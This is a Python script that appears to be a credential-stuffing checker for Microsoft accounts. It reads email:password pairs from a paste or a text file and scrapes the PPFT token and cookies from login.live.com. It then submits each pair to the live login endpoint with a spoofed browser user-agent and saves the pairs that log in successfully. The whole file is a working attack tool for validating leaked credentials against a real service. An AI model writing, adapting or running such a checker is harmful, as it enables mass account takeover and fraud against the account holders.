import requests
import re
import tkinter as tk
from tkinter import filedialog
from requests.structures import CaseInsensitiveDict
from os import system

def clear():
    system("cls")

works = ""

print("Do you want to select a file or paste? (Paste/Select)")
answer = input("").lower()
clear()
if answer == "paste":
    mails = []
    print("paste")
    while True:
        input_ = input("")
        if input_ == "clear":
            mails.clear()
            clear()
            print("paste")
            continue
        if input_ == "":
            while "" in mails:
                mails.remove("")
            break
        else:
            mails.append(input_)
elif answer == "select":
    mailsfile = filedialog.askopenfile(mode="r", title="Select A File", filetypes =[('Text Files', '*.txt')])
    mails = open(mailsfile.name).read().strip().split('\n')
else:
    exit()

for mail_ in mails:

    password = mail_.split(":")[1]
    mail = mail_.split(":")[0]

    resp = requests.get("https://login.live.com/")
    FindUrl = resp.text.find("urlLogin")

    url = "https://login.live.com/ppsecure/post.srf?uaid=" + resp.cookies['uaid']
    MSPOK = resp.cookies['MSPOK']
    PPFTIndex = [m.start() for m in re.finditer("PPFT", resp.text)]
    PPFT = resp.text[PPFTIndex[1]:(PPFTIndex[1]+5000)].split('value')[1][2:].split('"')[0]

    headers = CaseInsensitiveDict()
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    headers["Referer"] = "https://login.live.com/"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["Origin"] = "https://login.live.com"
    headers["Connection"] = "keep-alive"
    headers["Cookie"] = "MSPOK={}".format(MSPOK)

    data = "i13=0&login={}&loginfmt={}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={}=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=1&IsFidoSupported=1&isSignupPost=0&i19=23840".format(mail,mail, password, PPFT)
    resp = requests.post(url, headers=headers, data=data)

    find_answer = resp.text.find("A single-use code")
    print("-------------------------------------")
    if find_answer == -1:
        if str(resp.content).find("required to sign in") == -1:
            print("work")
            works+=mail_
            works+="\n"
        else:
            print("blocked")
    else:
        print("doesn't work")

count = 0
count_ = 0

for i in mails:
    count+=1
for i in works.strip().split("\n"):
    count_+=1  

if count_ == count:
    if answer == "paste":
        print("Do you want to save the mails in a file? (y/N)")
        answer_ = input("").lower()
        if answer_ == "y":
            save = filedialog.asksaveasfile(mode="w", title="Save To A File", filetypes =[('Text Files', '*.txt')], defaultextension='.txt')
            open(save.name, "w").write(works.strip())
            exit()
        else:
            exit()

print("Do you want to delete all mails that are not working? (y/N)")
answer_ = input("").lower()

if answer_ == "y":
    if answer == "select":
        open(mailsfile.name, "w").write(works.strip())
    else:
        print(works.strip())
        print("Do you want to save the mails that work in a file? (y/N)")
        answer = input("").lower()
        if answer == "y":
            save = filedialog.asksaveasfile(mode="w", title="Save To A File", filetypes =[('Text Files', '*.txt')], defaultextension='.txt')
            open(save.name, "w").write(works.strip())
        else:
            exit()

elif answer_ == "n":
    exit()

